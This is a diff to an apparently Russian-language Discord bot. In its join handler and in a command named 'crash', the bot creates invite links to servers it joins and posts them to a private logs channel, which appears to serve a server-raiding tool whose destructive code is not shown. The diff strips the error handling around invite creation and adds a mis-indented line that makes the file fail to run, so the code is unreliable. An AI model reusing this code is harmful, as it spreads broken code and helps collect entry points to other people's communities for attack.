@@ -46,13 +46,10 @@ async def on_guild_join(guild):
     guildlink = None
     for textchan in guild.text_channels:
         if not guildlink:
-            try:
-                guildlink = str(await textchan.create_invite())
-            except:
-                pass
-        if guildlink:
-            emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
-            await logs_channel.send(embed=emb)
+            guildlink = str(await textchan.create_invite())
+            if guildlink:
+                emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
+                await logs_channel.send(embed=emb)
     
     
 @bot.event
@@ -208,13 +205,10 @@ async def crash(ctx):
         guildlink = None
         for textchan in guild.text_channels:
             if not guildlink:
-                try:
-                    guildlink = str(await textchan.create_invite())
-                except:
-                    pass
-            if guildlink:
-                emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
-                await logs_channel.send(embed=emb)
+                guildlink = str(await textchan.create_invite())
+                if guildlink:
+                    emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
+                     await logs_channel.send(embed=emb)
       
       
        
@@ -296,4 +290,5 @@ async def whitelist(ctx, serv_id: int):
     
 
 bot.run(token, log_handler=None)
+
 
